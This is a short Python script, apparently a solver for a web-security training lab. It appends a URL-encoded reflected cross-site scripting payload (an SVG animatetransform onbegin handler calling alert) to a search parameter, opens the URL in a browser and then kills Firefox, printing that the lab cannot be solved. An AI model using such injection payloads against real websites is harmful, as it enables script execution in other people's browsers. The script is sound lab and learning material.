import pyautogui
import sys
import requests
import webbrowser
import time
import os

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E'
requests.get(burp_url)
webbrowser.open(burp_url)
time.sleep(5)
pyautogui.press('enter')
time.sleep(5)
os.system("pkill firefox")
print("For some unknown reason this quest cannot be solved. Even the community writeups included with the quest say so")
